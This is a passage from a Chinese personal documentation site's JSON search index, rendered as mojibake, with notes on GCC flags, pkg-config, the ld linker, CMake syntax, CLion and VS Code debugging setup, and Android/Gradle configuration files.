éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è®¾ç½®CFLAGSå’ŒLDFLAGSç¯å¢ƒå˜é‡æ—¶ï¼Œåº”è¯¥å°½å¯èƒ½é¿å…é‡å¤çš„æ ‡å¿—ã€‚å¦‚æœåŒä¸€ä¸ªæ ‡å¿—è¢«å¤šæ¬¡æŒ‡å®šï¼Œå¯èƒ½ä¼šå¯¼è‡´ç¼–è¯‘æˆ–é“¾æ¥é”™è¯¯ã€‚ å¤´æ–‡ä»¶ç›¸å…³ç¯å¢ƒå˜é‡ åœ¨Linuxä¸­, æœ‰å››ä¸ªç¯å¢ƒå˜é‡å¯ä»¥ç”¨æ¥è®¾ç½®é¢„å¤„ç†é˜¶æ®µå¤´æ–‡ä»¶æœç´¢è·¯å¾„: C_INCLUDE_PATHï¼ˆç”¨äºCè¯­è¨€ï¼‰ CPP_INCLUDE_PATHï¼ˆç”¨äºC++ï¼‰ CPATHï¼ˆéƒ½å¯ä»¥ç”¨ï¼‰ OBJC_INCLUDE_PATH æ³¨æ„Linuxä¸­, å®ƒä»¬çš„å–å€¼å¯ä»¥æ˜¯ä¸€ç»„ç”¨:åˆ†å‰²å¼€çš„åœ°å€åˆ—è¡¨, ç±»ä¼¼äºç¯å¢ƒå˜é‡PATH pkg-config å½“éœ€è¦æŒ‡å®šçš„å¤´æ–‡ä»¶ç›®å½•éå¸¸å¤šæ—¶, å…¨éƒ¨å†™åœ¨å‚æ•°å°±éå¸¸éº»çƒ¦, äºæ˜¯å¯ä»¥ç”¨: pkg-config ç¤ºä¾‹, æŸ¥çœ‹å¤´æ–‡ä»¶åº“æ–‡ä»¶è·¯å¾„: yanque@yanquedembp ~ % pkg-config --cflags glib-2.0 -I/usr/local/Cellar/glib/2.70.4/include/glib-2.0 -I/usr/local/Cellar/glib/2.70.4/lib/glib-2.0/include -I/usr/local/opt/gettext/include -I/usr/local/Cellar/pcre/8.45/include yanque@yanquedembp ~ % yanque@yanquedembp ~ % pkg-config --libs glib-2.0 -L/usr/local/Cellar/glib/2.70.4/lib -L/usr/local/opt/gettext/lib -lglib-2.0 -lintl ldä¸gccè”ç³» ldå’ŒCç¼–è¯‘å™¨ï¼ˆå¦‚gccï¼‰éƒ½æ˜¯GNUç¼–è¯‘å·¥å…·é“¾çš„ä¸€éƒ¨åˆ†ï¼Œä½†å®ƒä»¬çš„ä½œç”¨æœ‰æ‰€ä¸åŒã€‚ Cç¼–è¯‘å™¨ä¸»è¦ç”¨äºå°†æºä»£ç ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ ï¼Œè¿™äº›ç›®æ ‡æ–‡ä»¶å¯ä»¥æ˜¯æœºå™¨ç æˆ–æ±‡ç¼–ä»£ç ã€‚ åœ¨ç¼–è¯‘æºä»£ç è¿‡ç¨‹ä¸­ï¼ŒCç¼–è¯‘å™¨ä¼šå¯¹ä»£ç è¿›è¡Œè¯­æ³•åˆ†æå’Œç±»å‹æ£€æŸ¥ï¼Œå¹¶ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æ‰€éœ€çš„ç¬¦å·è¡¨ã€é‡å®šä½è¡¨ç­‰ä¿¡æ¯ã€‚ åŒæ—¶ï¼ŒCç¼–è¯‘å™¨è¿˜ä¼šå°†æºä»£ç ä¸­ä½¿ç”¨åˆ°çš„åº“æ–‡ä»¶é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œä»¥ä¾¿ç¨‹åºèƒ½å¤Ÿæ­£ç¡®åœ°è¿è¡Œã€‚ é“¾æ¥å™¨ï¼ˆldï¼‰åˆ™ä¸»è¦ç”¨äºå°†å¤šä¸ªç›®æ ‡æ–‡ä»¶é“¾æ¥æˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“ ã€‚ åœ¨é“¾æ¥è¿‡ç¨‹ä¸­ï¼Œé“¾æ¥å™¨ä¼šæ ¹æ®ç¬¦å·è¡¨å’Œé‡å®šä½è¡¨ç­‰ä¿¡æ¯ï¼Œå°†ä¸åŒçš„ç›®æ ‡æ–‡ä»¶åˆå¹¶ä¸ºä¸€ä¸ªæ•´ä½“ï¼Œ å¹¶è§£å†³å„ç§ç¬¦å·å¼•ç”¨å’Œåœ°å€é‡å®šä½é—®é¢˜ï¼Œæœ€ç»ˆç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–å…±äº«åº“ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯, åœ¨Linuxç³»ç»Ÿä¸­, é“¾æ¥å™¨é€šå¸¸ç”±Cç¼–è¯‘å™¨è‡ªåŠ¨è°ƒç”¨ ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ç¼–è¯‘æºä»£ç æ—¶ï¼ŒCç¼–è¯‘å™¨ä¼šè‡ªåŠ¨è°ƒç”¨é“¾æ¥å™¨æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤ï¼Œåœ¨ä½¿ç”¨gccç¼–è¯‘æ—¶ï¼Œä½ æ— éœ€æ‰‹åŠ¨è°ƒç”¨é“¾æ¥å™¨ã€‚ msvc ä¸gccç±»ä¼¼, æ˜¯msvc å¾®è½¯çš„ä¸€ä¸ªé—­æºç¼–è¯‘å™¨, ä»…æ”¯æŒWindows, ä¹Ÿä¸æ”¯æŒé«˜ç‰ˆæœ¬çš„è¯­è¨€ç‰¹æ€§/æ ‡å‡†, ä¸è¿‡æä¾›äº†ä¸ç¼–è¯‘å¤´æ–‡ä»¶ç­‰æŠ€æœ¯åŠ å¿«ç¼–è¯‘é€Ÿåº¦ ç¼–è¯‘åçš„æ–‡ä»¶è¯´æ˜ .aæ–‡ä»¶, é™æ€åº“æ–‡ä»¶ .oæ–‡ä»¶, å¯¹è±¡æ–‡ä»¶, ç›®æ ‡æ–‡ä»¶ .soæ–‡ä»¶, å…±äº«åº“æ–‡ä»¶ ä¸€èˆ¬ä½¿ç”¨g++ç¼–è¯‘, é»˜è®¤ç”Ÿæˆçš„å°±æ˜¯ .o æ–‡ä»¶, è¡¨ç¤ºä¸€ä¸ªå¯¹è±¡æ–‡ä»¶, æ˜¯å•ä¸ªæºä»£ç æ–‡ä»¶ç¼–è¯‘åçš„ç»“æœ. éœ€è¦åœ¨é“¾æ¥è¿‡ç¨‹ä¸­å’Œå…¶ä»– .o æ–‡ä»¶æˆ–è€…åº“æ–‡ä»¶é“¾æ¥åˆ°ä¸€èµ·,ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶. ç”¨äºåŠ¨æ€é“¾æ¥,ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶è¾ƒå°ä½†è¿è¡Œæ—¶è¿˜éœ€è¦åŸæ¥çš„ .o æ–‡ä»¶. åŠ¨æ€é“¾æ¥çš„ä¼˜ç‚¹æ˜¯å¯æ‰§è¡Œæ–‡ä»¶è¾ƒå°, è¿è¡Œæ—¶å¯¹ç¯å¢ƒä¾èµ–æ€§æ›´å¼º. .a æ–‡ä»¶ç”±å¤šä¸ª .o æ–‡ä»¶èšåˆè€Œæˆ, ç”¨äºé™æ€é“¾æ¥, ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶è¾ƒå¤§ä½†è¿è¡Œæ—¶ä¸éœ€è¦ .a æ–‡ä»¶. é™æ€é“¾æ¥çš„ä¼˜ç‚¹æ˜¯è¿è¡Œæ›´å¿«,ä½†å¯æ‰§è¡Œæ–‡ä»¶è¾ƒå¤§. å¦‚å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰ .o æ–‡ä»¶æ‰“åŒ…ä¸ºé™æ€åº“æ–‡ä»¶( .m æ–‡ä»¶): ar -rc res.m *.o arä½¿ç”¨å¯è§ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/ar","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-GCC-(++)-compiler.html","loc":"/yq-doc-source-docs-rear-end-from-GCC-(++)-compiler.html"},{"title":"ä¸€äº›å…³é”®å­—","text":"extern åœ¨å£°æ˜ä¹‹å‰, å…ˆå¼•ç”¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­çš„å˜é‡, å¦‚: extern int num; printf(\"%d\",num); int num = 3; å¼•ç”¨å¦ä¸€ä¸ªæ–‡ä»¶ä¸­çš„å˜é‡/å‡½æ•°","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-Some-keywords.html","loc":"/yq-doc-source-docs-rear-end-from-Some-keywords.html"},{"title":"string.h","text":"strcpy strcpy(a, b): ç›¸å½“äºpythonçš„å€¼ä¼ é€’èµ‹å€¼, æŠŠbå¤åˆ¶ä¸€ä»½ç»™a strcat strcat(a, b): å­—ç¬¦ä¸²åŸåœ°æ‹¼æ¥, ç›¸å½“äºpythonçš„ a = a+b strlen strtok","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-Standard-library-string-h.html","loc":"/yq-doc-source-docs-rear-end-from-Standard-library-string-h.html"},{"title":"ä½¿ç”¨CLioné‡åˆ°çš„å‘","text":"c(++)çš„é¡¹ç›®æ ¹æ®ä¸åŒçš„ç¼–è¯‘æ–¹å¼, å¯ä»¥åˆ†ä¸ºå‡ ç±»é¡¹ç›®: cmake makefile compilation database gradle å®˜ç½‘æŒ‡å¼•:: https://www.jetbrains.com/help/clion/clion-quick-start-guide.html#open-create-prj https://www.jetbrains.com/zh-cn/clion/features/start-your-project.html æš‚ä¸”åªè¯´cmakeé¡¹ç›® é…ç½® å¯¹äºCLionè€Œè¨€, éœ€è¦é…ç½®çš„ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªåœ°æ–¹: å·¥å…·é“¾ åœ¨æ­¤å¤„æŒ‡å®šmake, gcc, g++ çš„è·¯å¾„ cmake æŒ‡å®šæœ¬cmakeé¡¹ç›®ä½¿ç”¨å“ªä¸€ä¸ªé…ç½®çš„å·¥å…·é“¾ CMakeLists.txt CMakeLists.txtä½äºé¡¹ç›®æ ¹ç›®å½•ä¸‹, é‡Œé¢å†™æ˜äº†å¦‚ä½•æ„å»ºç¯å¢ƒ. æ¯”å¦‚ç¯å¢ƒå˜é‡, å¦‚ä½•è¿è¡Œéƒ½ä¾èµ–æ­¤æ–‡ä»¶. å·¥å…·é“¾å’Œcmake æ³¨è§£ è‹¥æ— cmakeéœ€è¦è‡ªè¡Œä¸‹è½½å®‰è£…, æ­£å¸¸ç›´æ¥æ‰§è¡Œ: xcode-select --install å®‰è£…å¥½ç»‘å®šçš„å·¥å…·å³å¯(ä¸è¿‡æˆ‘ç”¨çš„æ—¶å€™, è¿™æ ·ç”Ÿæˆçš„é»˜è®¤æ„å»ºå·¥å…·ninjaä½¿ç”¨çš„æ—¶å€™æœ‰äº›é—®é¢˜). è‹¥éœ€è¦è‡ªè¡Œå®‰è£…cmakeå®˜ç½‘ç‰ˆæœ¬, å¯å‚è€ƒ /docs/åç«¯/c/cmake æ‰“å¼€é¡¹ç›® å¯¹äºcmakeé¡¹ç›®è€Œè¨€, æ‰“å¼€é¡¹ç›®æ—¶, é¡¹ç›®æ ¹ç›®å½•ä¸‹ä¸€å®šè¦æœ‰ CMakeLists.txt æ–‡ä»¶. CLionä¼šæ ¹æ®, ä¸”åªä¼šæ ¹æ®æ­¤æ–‡ä»¶å»ç¼–è¯‘é¡¹ç›®, ç±»ä¼¼åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤: mkdir cmake-build-debug && cd cmake-build-debug && cmake ../ ç„¶åä¼šç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œçš„é…ç½®(å°±æ˜¯å³ä¸Šè§’é‚£ä¸ªç»¿è‰²ä¸‰è§’å½¢äº†) æ‰¾ä¸åˆ°é¡¹ç›®å¤´æ–‡ä»¶ æ‰“å¼€ CMakeLists.txt , åœ¨å…¶ä¸­åŠ å…¥å¤´æ–‡ä»¶æœç´¢è·¯å¾„, å¤šä¸ªè·¯å¾„ç›´æ¥æ¢è¡Œå³å¯: include_directories( path1 path2 ... ) å°†CLioné¡¹ç›®è½¬æ¢ä¸ºVSå·¥ç¨‹ æ ¹ç›®å½•ä¸‹æ‰§è¡Œ: mkdir build cd build cmake -G \"Visual Studio 16 2019\" -A x64 .. å‚è€ƒ:: https://www.coder.work/article/7296599 cmakeè¯¦è§£:: https://www.cnblogs.com/kuliuheng/p/9431275.html æ³¨è§£ cmake ä¸ make ç›¸æ¯”èƒ½å¤Ÿæ›´å¥½çš„å®ç°è·¨å¹³å°çš„å…¼å®¹. cmake: æ ¹æ® CMakeLists.txt ç”Ÿæˆé€‚é…ä¸åŒå¹³å°çš„ makefile, å†æ ¹æ®æ­¤makefileå»æ‰§è¡Œç¼–è¯‘ makefile: ç›´æ¥æ ¹æ®makefileå†…å®¹ç¼–è¯‘ç”Ÿæˆ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-Use-CLION.html","loc":"/yq-doc-source-docs-rear-end-from-Use-CLION.html"},{"title":"cmake","text":"å®‰è£… ä¸‹è½½åœ°å€: https://cmake.org/download/ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è®¾ç½®ç¯å¢ƒå˜é‡: sudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install ä¾‹å¦‚è¿™æ ·çš„è¾“å‡º: yanque@yanquedembp PlantsVsZombies % sudo \"/Applications/CMake.app/Contents/bin/cmake-gui\" --install Password: Linked: '/usr/local/bin/cmake' -> '/Applications/CMake.app/Contents/bin/cmake' Linked: '/usr/local/bin/ctest' -> '/Applications/CMake.app/Contents/bin/ctest' Linked: '/usr/local/bin/cpack' -> '/Applications/CMake.app/Contents/bin/cpack' Linked: '/usr/local/bin/cmake-gui' -> '/Applications/CMake.app/Contents/bin/cmake-gui' Linked: '/usr/local/bin/ccmake' -> '/Applications/CMake.app/Contents/bin/ccmake' yanque@yanquedembp PlantsVsZombies % åŸºæœ¬è¯­æ³• æ³¨é‡Š: ä½¿ç”¨# å‘½ä»¤ä¸åŒºåˆ†å¤§å°å†™, å˜é‡åŒºåˆ†å¤§å°å†™ å®šä¹‰å˜é‡: set - å®šä¹‰å­—ç¬¦ä¸²: set(var1 str_data) - å®šä¹‰åˆ—è¡¨: set(var_list var1 var2 var3 ...) - bool: Trueå°±æ˜¯ON, Falseå°±æ˜¯OFF, å¦‚set(bool_var OFF) - ä½¿ç”¨ç¾å…ƒç¬¦åŠ èŠ±æ‹¬å· ${} æ¥è®¿é—®å®šä¹‰çš„å˜é‡, è‹¥ä½¿ç”¨ä¸ifè¯­å¥, åˆ™ä¸éœ€è¦, ç›´æ¥ä½¿ç”¨å˜é‡åç§°å³å¯ - è®¿é—®ç¯å¢ƒå˜é‡: ä¸æ™®é€šå˜é‡ç›¸æ¯”, éœ€è¦åŠ ä¸Š ENV, å¦‚$ENV{VariableName} æ‰“å°è¾“å‡º: ä½¿ç”¨ message, å¦‚message(\"var=${var}\") å¸¸ç”¨å˜é‡ å¸¸ç”¨å˜é‡: UNIX å¦‚æœä¸ºçœŸï¼Œè¡¨ç¤ºä¸ºUNIX-likeçš„ç³»ç»Ÿï¼ŒåŒ…æ‹¬AppleOSXå’ŒCygWin WIN32 å¦‚æœä¸ºçœŸï¼Œè¡¨ç¤ºä¸º Windows ç³»ç»Ÿï¼ŒåŒ…æ‹¬ CygWin APPLE å¦‚æœä¸ºçœŸï¼Œè¡¨ç¤ºä¸º Apple ç³»ç»Ÿ CMAKE_SIZEOF_VOID_P è¡¨ç¤ºvoid*çš„å¤§å°ï¼ˆä¾‹å¦‚ä¸º4æˆ–è€…8ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨å…¶æ¥åˆ¤æ–­å½“å‰æ„å»ºä¸º32ä½è¿˜æ˜¯64ä½ CMAKE_CURRENT_LIST_DIR è¡¨ç¤ºæ­£åœ¨å¤„ç†çš„CMakeLists.txtæ–‡ä»¶çš„æ‰€åœ¨çš„ç›®å½•çš„ç»å¯¹è·¯å¾„(2.8.3ä»¥åŠä»¥åç‰ˆæœ¬æ‰æ”¯æŒ) CMAKE_ARCHIVE_OUTPUT_DIRECTORY ç”¨äºè®¾ç½®ARCHIVEç›®æ ‡çš„è¾“å‡ºè·¯å¾„ CMAKE_LIBRARY_OUTPUT_DIRECTORY ç”¨äºè®¾ç½®LIBRARYç›®æ ‡çš„è¾“å‡ºè·¯å¾„ CMAKE_RUNTIME_OUTPUT_DIRECTORY ç”¨äºè®¾ç½®RUNTIMEç›®æ ‡çš„è¾“å‡ºè·¯å¾„ å‚è€ƒ:: https://blog.csdn.net/qq_23123181/article/details/122736393?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122736393-blog-80902807.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-122736393-blog-80902807.pc_relevant_recovery_v2&utm_relevant_index=3 https://blog.csdn.net/zhanghm1995/article/details/80902807","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-cmake.html","loc":"/yq-doc-source-docs-rear-end-from-cmake.html"},{"title":"cmakelists.txtç¼–å†™","text":"cmakelists.txtæ˜¯åŸºäºcmakeæŒ‡ä»¤çš„. æ™®é€šå˜é‡ ä½¿ç”¨ set(var value) èµ‹å€¼, ä½¿ç”¨ ${} æ–¹å¼å–å€¼,ä½†æ˜¯åœ¨IFæ§åˆ¶è¯­å¥ä¸­æ˜¯ç›´æ¥ä½¿ç”¨å˜é‡å è·å–ç¯å¢ƒå˜é‡ ä½¿ç”¨ $ENV{} æ–¹å¼å–å€¼,ä½¿ç”¨ SET(ENV{VAR} VALUE) èµ‹å€¼ å®šä¹‰boolå˜é‡ ä½¿ç”¨ set, ä»¥ä¸‹ç›¸å½“ bool DEBUG = True SET(DEBUG ON) OFF å°±æ˜¯ False æ³¨è§£ åƒsetè¿™ç§å…³é”®å­—ä¸åŒºåˆ†å¤§å°å†™, ä½†æ˜¯å˜é‡ååŒºåˆ†å¤§å°å†™; ä½¿ç”¨ if è¯­å¥æ—¶, ç›´æ¥ä½¿ç”¨å˜é‡å, ä¸éœ€è¦ç”¨èŠ±æ‹¬å·åŒ…è£¹ æ‰“å°è¾“å‡º ä½¿ç”¨ MESSAGE MESSAGE(\"DEBUG=\" ${DEBUG}) æ‰§è¡ŒcmakeæŒ‡ä»¤ ä½¿ç”¨execute_process åˆ›å»ºæ–‡ä»¶å¤¹ ä½¿ç”¨ execute_process, åˆ›å»ºä¸€ä¸ªnewdir, æ³¨æ„å®šä¹‰ new_dir: execute_process( COMMAND ${CMAKE_COMMAND} -E make_directory ${new_dir}) å¤åˆ¶æ–‡ä»¶å¤¹ ä½¿ç”¨ execute_process, å°†dir1å¤åˆ¶åˆ°dir2, æ³¨æ„å®šä¹‰ dir1 dir2: execute_process( COMMAND ${CMAKE_COMMAND} -E copy_directory ${dir1} ${dir2}) å¤åˆ¶æ–‡ä»¶ ä½¿ç”¨ execute_process, å°†file1å¤åˆ¶åˆ°file2, æ³¨æ„å®šä¹‰ file1 file2: execute_process( COMMAND ${CMAKE_COMMAND} -E copy ${file1} ${file2}) æ·»åŠ å­ç›®å½•çš„CMakeLists.txt å¦‚, åœ¨æ ¹ç›®å½•ä¸‹, æ–°å»ºStackç›®å½•, åœ¨Stackä¸­å»ºç«‹ä¸€ä¸ªCMakeLists.txtæ–‡ä»¶ æ ¹ç›®å½•éœ€å¢åŠ å¦‚ä¸‹è¯­å¥: add_subdirectory(Stack) æ›´å¤šè§: /docs/åç«¯/c/cmake","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-cmakelists.html","loc":"/yq-doc-source-docs-rear-end-from-cmakelists.html"},{"title":"vscodeè°ƒè¯•ç›¸å…³","text":"è°ƒè¯•å‘½ä»¤å·¥å…· gdb lldb æ³¨è§£ lldb æ˜¯macä¸Šæ‰æœ‰çš„, xcodeä½ç‰ˆæœ¬ä½¿ç”¨çš„æ˜¯gdbè°ƒè¯•, é«˜ç‰ˆæœ¬æ¢æˆäº†å†…ç½®lldb å¦å¤–, gcc ä¸ g++ æ˜¯ç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶çš„, gdbä¸lldbæ‰æ˜¯è°ƒè¯•å·¥å…·. æŒ‡ä»¤åŒºåˆ«: lldbä¸gdbå‘½ä»¤åçš„å¯¹ç…§è¡¨ é…ç½®ç»éªŒ åˆ›å»ºlaunch.jsonè°ƒè¯•å™¨, æ”¯æŒç›´æ¥è°ƒè¯•ä¸é™„åŠ è°ƒè¯•(è¿™ä¸ªé…ç½®æ˜¯ç»™å·¦ä¾§çš„è°ƒè¯•å™¨ä½¿ç”¨çš„) ä¾‹: { \"version\": \"0.2.0\", \"configurations\": [ { \"name\": \"(lldb) å¯åŠ¨\", \"type\": \"cppdbg\", \"request\": \"launch\", \"program\": \"${fileDirname}/.debug/${fileBasenameNoExtension}.out\", \"args\": [], \"stopAtEntry\": false, \"cwd\": \"${fileDirname}\", \"environment\": [], \"externalConsole\": false, \"MIMode\": \"lldb\", \"preLaunchTask\": \"pre build\" } ] } ç±»ä¼¼c/c++ç¨‹åº, è°ƒè¯•ä¹‹å‰éœ€è¦å…ˆç¼–è¯‘ä¸ºå¯æ‰§è¡Œæ–‡ä»¶, è¿™ä¸ªæ—¶å€™å°±éœ€è¦ç”¨åˆ°task.jsoné…ç½®ä»»åŠ¡, æ­¤å¤„çš„ label ä¸ launch.json çš„ preLaunchTask ä¿æŒä¸€è‡´ ä¾‹: { \"tasks\": [ { \"label\": \"pre build\", \"type\": \"cppbuild\", \"command\": \"/usr/bin/g++\", \"args\": [ \"-fdiagnostics-color=always\", \"-g\", \"${file}\", \"-o\", \"${fileDirname}/.debug/${fileBasenameNoExtension}.out\" ], \"options\": { \"cwd\": \"${fileDirname}\" }, \"problemMatcher\": [ \"$gcc\" ], \"group\": { \"kind\": \"build\", \"isDefault\": true }, \"detail\": \"è°ƒè¯•å™¨ç”Ÿæˆçš„ä»»åŠ¡ã€‚\" } ], \"version\": \"2.0.0\" } æ³¨è§£ gccæŒ‡å®šè¾“å‡ºä½ç½®çš„æ—¶å€™, æœ‰bug..., ä¼šå¯¼è‡´å¡ä½. å¦å¤–å³ä¸Šè§’çš„å¯åŠ¨è°ƒè¯•ä¸å·¦è¾¹çš„ä¸æ˜¯ä¸€ä¸ªä¸œè¥¿. F5å¯åŠ¨çš„ä¹Ÿæ˜¯å·¦è¾¹é…ç½®çš„. ä¹Ÿå°±æ˜¯, F5å¯åŠ¨çš„æ˜¯jsoné…ç½®çš„è°ƒè¯•, ç›´æ¥å³ä¸Šè§’runæ˜¯å†…ç½®çš„ç›´æ¥æ‰§è¡Œç¼–è¯‘è¿è¡ŒæŒ‡ä»¤(ä¸è¿‡ç¼–è¯‘é‚£ä¸€æ­¥ä¼šå†™åˆ°task.jsonç§). é…ç½®æ–‡ä»¶è¯´æ˜ launch.json è¿™ä¸ªå¯ä»¥ä¸ç”¨è®¾ç½®, ç›´æ¥ä½¿ç”¨task.jsoné‡Œä»»åŠ¡ç”Ÿæˆè¾“å‡ºæ–‡ä»¶ task.json ç”¨æ¥é…ç½®ä»»åŠ¡, å¯åœ¨launch.jsoné‡Œé…ç½®ä»€ä¹ˆæ—¶å€™æ‰ç”¨ c_cpp_properties.json ç”¨äºç»™æ’ä»¶é…ç½®, æ¯”å¦‚ä½¿ç”¨çš„ include_path, æ³¨æ„è¿™é‡Œåªæ˜¯ç»™æ’ä»¶ä½¿ç”¨çš„, å¦‚æœéœ€è¦æ‰§è¡Œæˆ–è€…ç¼–è¯‘çš„æ—¶å€™ä½¿ç”¨éœ€è¦è‡ªå®šä¹‰ç¼–è¯‘æ—¶å€™çš„å‚æ•°, å¦‚ g++ -L æŒ‡å®šåº“è·¯å¾„ æ³¨è§£ æ³¨æ„ c_cpp_properties é…ç½®çš„ include_path ä¸èƒ½ç”¨äºæ‰§è¡Œæ—¶ä½¿ç”¨. æ‰§è¡Œæ—¶å€™åªèƒ½è‡ªå®šä¹‰å‚æ•°, å¯ä»¥é€šè¿‡åœ¨ setting.json é…ç½® code-runner.executorMap å¤„ç†. å…¶ä»– å¯ä»¥é€‰æ‹©å°ä¸‰è§’å½¢çš„å¯åŠ¨æ–¹å¼ å¯åŠ¨é€‰é¡¹ å¯ä»¥é€šè¿‡è®¾ç½®é€‰æ‹©å¯åŠ¨é€‰é¡¹ç›¸å¯¹åº”çš„ä»»åŠ¡ é€‰æ‹©å¯åŠ¨é€‰é¡¹å®é™…çš„æ‰§è¡Œ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-from-vSCode-debugging-related.html","loc":"/yq-doc-source-docs-rear-end-from-vSCode-debugging-related.html"},{"title":"èµ„æºæ–‡ä»¶ä»‹ç»","text":"res/layout/main.xml Appä¸»çª—ä½“å¸ƒå±€æ–‡ä»¶ï¼Œåº”ç”¨é•¿ä»€ä¹ˆæ ·éƒ½åœ¨è¿™è¾¹å®šä¹‰ï¼Œæœ‰Designå’ŒTextä¸¤ç§æ¨¡å¼ res/values/strings.xml å¯ä»¥ç†è§£ä¸ºi18næ–‡ä»¶ï¼Œç”¨æ¥å­˜æ”¾ç¨‹åºè°ƒç”¨çš„å„ç§å­—ç¬¦ä¸² src/com/example/helloandroid/MyActivity.java ä¸»ç¨‹åºç±»ï¼Œè¦å®ç°çš„åŠŸèƒ½éƒ½åœ¨è¿™ä¸ªæ–‡ä»¶é‡Œæ·»åŠ ","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-java-Android-development-Resource-file-introduction.html","loc":"/yq-doc-source-docs-rear-end-java-Android-development-Resource-file-introduction.html"},{"title":"é…ç½®æ–‡ä»¶è¯´æ˜","text":"build.gradle settings.gradle æ³¨è§£ settings.gradle ç¼–è¯‘ä¼˜å…ˆçº§é«˜äºbuild.gradle build.gradle build.gradle æ˜¯é¡¹ç›®æ„å»ºæ‰€ä½¿ç”¨çš„è„šæœ¬ã€‚ settings.gradle settings.gradle å¿…è¦çš„ä¸€äº›è®¾ç½®ï¼Œä¾‹å¦‚ï¼Œä»»åŠ¡æˆ–é¡¹ç›®ä¹‹é—´çš„ä¾æ‡’å…³ç³»ç­‰ settings.gradleæ˜¯æ¨¡å—Moduleé…ç½®æ–‡ä»¶ï¼Œä¸»è¦æ˜¯ç”¨äºé…ç½®å­æ¨¡å—ï¼Œ æ ¹ç›®å½•ä¸‹çš„setting.gradleè„šæœ¬æ–‡ä»¶æ˜¯é’ˆå¯¹moduleçš„å…¨å±€é…ç½®, å¦‚: // ä¸ºæŒ‡å®šçˆ¶æ¨¡å—çš„åç§° å¹³å°æ ¹ rootProject.name = 'project-root' //åŒ…å«å­ç³»ç»Ÿä»¥åŠæ¨¡å— include ':project-core' //Helloç³»ç»Ÿæ¨¡å—çš„åŠ è½½ include ':project-hello' //Worldç³»ç»Ÿæ¨¡å—çš„åŠ è½½ include ':project-world' å•é¡¹ç›®æ„å»ºè¯¥æ–‡ä»¶å¯é€‰ï¼Œå¤šé¡¹ç›®æ„å»ºå¿…é¡», å› ä¸ºéœ€è¦åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å£°æ˜å“ªäº›å­é¡¹ç›®éœ€è¦å‚ä¸æ„å»ºï¼Œä¹ŸåŒ…æ‹¬å­é¡¹ç›®è·¯å¾„ã€åç§°ç­‰. å¤šé¡¹ç›®çš„æ„å»ºåŸåˆ™: å¦‚æœè¯¥æ„å»ºç›®å½•ä¸­å­˜åœ¨settings.gradleæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±ä¾æ®è¯¥æ–‡ä»¶æ¥è¿›è¡Œæ„å»ºï¼› å¦‚æœä¸å­˜åœ¨è¯¥æ–‡ä»¶ï¼Œé‚£ä¹ˆä¼šå‘ä¸Šä¸€çº§ç›®å½•æŸ¥è¯¢æ–‡ä»¶æ˜¯å¦å­˜åœ¨(æ³¨æ„ï¼šåªä¼šå‘çˆ¶ç›®å½•æŸ¥è¯¢ï¼Œè€Œä¸æ˜¯ä¸€ç›´å‘ä¸Šçº§ç›®å½•é€’å½’æŸ¥è¯¢)ï¼Œ å¦‚æœå­˜åœ¨å°±ä¾æ®è¯¥æ–‡ä»¶è¿›è¡Œæ„å»ºï¼Œå¦åˆ™æ­¤æ¬¡æ„å»ºå°±æ˜¯ä¸€ä¸ªå•é¡¹ç›®çš„æ„å»º æ–‡ä»¶ç»“æ„åŠå…¶é…ç½® plugins: éœ€è¦å¼•è¿›çš„ç›¸å…³æ’ä»¶Plugins, æ­¤å¤„è°ƒç”¨äº† PluginDependenciesSpec ä¸­çš„ id æ–¹æ³•, å¦‚: // éœ€è¦å¼•è¿›çš„ç›¸å…³æ’ä»¶Plugins plugins { // 'com.android.application' è¡¨ç¤ºåº”ç”¨com.android.applicationæ’ä»¶ id 'com.android.application' } repositories: ä»“åº“é…ç½®, ç”¨äºå­˜å‚¨ä¾èµ–(ä»å“ªä¸‹è½½ä¾èµ–), å¦‚: // repositoriesé—­åŒ… å­˜å‚¨åº“ // å£°æ˜åœ¨ä½•å¤„æŸ¥æ‰¾é¡¹ç›®çš„ä¾èµ–é¡¹ repositories { // æŒ‡å®šä½¿ç”¨mavenæœ¬åœ°ä»“åº“ï¼Œè€Œæœ¬åœ°ä»“åº“åœ¨é…ç½®mavenæ—¶settingæ–‡ä»¶æŒ‡å®šçš„ä»“åº“ä½ç½®ã€‚ mavenLocal() maven { name \"aliyun\" url \"https://maven.aliyun.com/repository/gradle-plugin\" } // 